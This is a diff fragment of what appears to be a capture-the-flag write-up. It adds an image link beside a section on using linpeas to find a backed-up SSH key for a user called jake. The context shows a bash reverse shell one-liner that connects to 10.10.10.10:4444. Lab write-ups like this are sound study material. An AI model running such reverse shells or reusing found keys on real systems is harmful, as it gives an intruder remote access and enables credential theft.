@@ -65,6 +65,8 @@ bash -c 'sh -i >& /dev/tcp/10.10.10.10/4444 0>&1'
 ## Flag
 I runned linpeas and found /opt/.backups/jake_id_rsa.pub.backup contains jake's key. 
 
+![image](https://user-images.githubusercontent.com/6504854/185606932-45739dad-165f-4f9c-bad4-63399de08be4.png)
+
 ```
 ┌──(kali)-[~]
 └─$ ssh-keygen -f jake_key
